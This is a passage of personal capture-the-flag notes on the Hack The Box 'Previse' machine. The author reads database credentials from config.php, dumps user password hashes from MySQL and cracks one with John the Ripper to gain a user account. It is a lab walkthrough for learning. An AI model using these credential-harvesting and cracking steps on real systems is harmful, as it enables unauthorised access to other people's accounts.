# Privilege escalation to m4lwhere user
## Reading contents of config.php
Reading contents of config.php found sql database username and password.
```bash
www-data@previse:/var/www/html$ ls
ls
caccounts.php               download.php       footer.php  logs.php
android-chrome-192x192.png  favicon-16x16.png  header.php  nav.php
android-chrome-512x512.png  favicon-32x32.png  index.php   site.webmanifest
apple-touch-icon.png        favicon.ico        js          status.php
config.php                  file_logs.php      login.php
css                         files.php          logout.php
www-data@previse:/var/www/html$cat config.php
cat config.php
<?php

function connectDB(){
    $host = 'localhost';
    $user = 'root';
    $passwd = 'mySQL_p@ssw0rd!:)';
    $db = 'previse';
    $mycon = new mysqli($host, $user, $passwd, $db);
    return $mycon;
}

?>
www-data@previse:/var/www/html$
```
## Reading contents of sql database got hashed password of m4lwhere user
```bash
www-data@previse:/var/www/html$cat config.php
cat config.php
<?php

function connectDB(){
    $host = 'localhost';
    $user = 'root';
    $passwd = 'mySQL_p@ssw0rd!:)';
    $db = 'previse';
    $mycon = new mysqli($host, $user, $passwd, $db);
    return $mycon;
}

?>
www-data@previse:/var/www/html$ mysql -u root -p
mysql -u root -p
Enter password: mySQL_p@ssw0rd!:)

Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 16
Server version: 5.7.35-0ubuntu0.18.04.1 (Ubuntu)

Copyright (c) 2000, 2021, Oracle and/or its affiliates.

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

mysql> use previse;
use previse;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
mysql> show tables;
show tables;
+-------------------+
| Tables_in_previse |
+-------------------+
| accounts          |
| files             |
+-------------------+
2 rows in set (0.00 sec)

mysql> select * from accounts;
select * from accounts;
+----+----------+------------------------------------+---------------------+
| id | username | password                           | created_at          |
+----+----------+------------------------------------+---------------------+
|  1 | m4lwhere | $1$🧂llol$DQpmdvnb7EeuO6UaqRItf. | 2021-05-27 18:18:36 |
|  2 | clarkey  | $1$🧂llol$eBQMPwAvz9j9ZpK62qDI// | 2021-09-18 06:17:54 |
+----+----------+------------------------------------+---------------------+
2 rows in set (0.00 sec)

mysql>
```
![[Pasted image 20210918115839.png]]
## Cracking hash using `johntheripper` to get m4lwhere user password
```bash
~/Dropbox/Documents/htb/boxes/previse ❯ john --format=md5crypt-long hash.hash --wordlist=/home/kali/Dropbox/Documents/htb/boxes/compromised/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (md5crypt-long, crypt(3) $1$ (and variants) [MD5 32/64])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
0g 0:00:02:05 23.46% (ETA: 12:11:01) 0g/s 28432p/s 28432c/s 28432C/s stalonh..stallout54
0g 0:00:03:25 39.45% (ETA: 12:10:48) 0g/s 28192p/s 28192c/s 28192C/s marikarmen22_**..marika5601
ilovecody112235! (?)
1g 0:00:04:23 DONE (2021-09-18 12:06) 0.003801g/s 28181p/s 28181c/s 28181C/s ilovecodydean..ilovecody..
Use the "--show" option to display all of the cracked passwords reliably
Session completed
~/Dropbox/Documents/htb/boxes/previse 4m 23s ❯ john --show hash.hash
?:ilovecody112235!

1 password hash cracked, 0 left
```
![[Pasted image 20210918120857.png]]
## SSH logging in as m4lwhere user
![[Pasted image 20210918121051.png]]
